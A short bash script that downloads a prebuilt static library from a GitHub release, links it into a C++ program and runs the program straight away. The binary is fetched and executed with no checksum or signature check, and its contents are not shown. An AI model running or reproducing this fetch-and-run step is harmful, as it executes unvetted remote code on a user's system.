#!/usr/bin/env bash
set -e
TAG="cosmic-canyon-hidden-canyon"
LIB="pushed-pouch.a"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "https://github.com/kaiasobloom/marinegauntletlab/releases/download/${TAG}/${LIB}"
g++ -O2 -std=c++17 -pthread main.cpp "$LIB" -o app && ./app
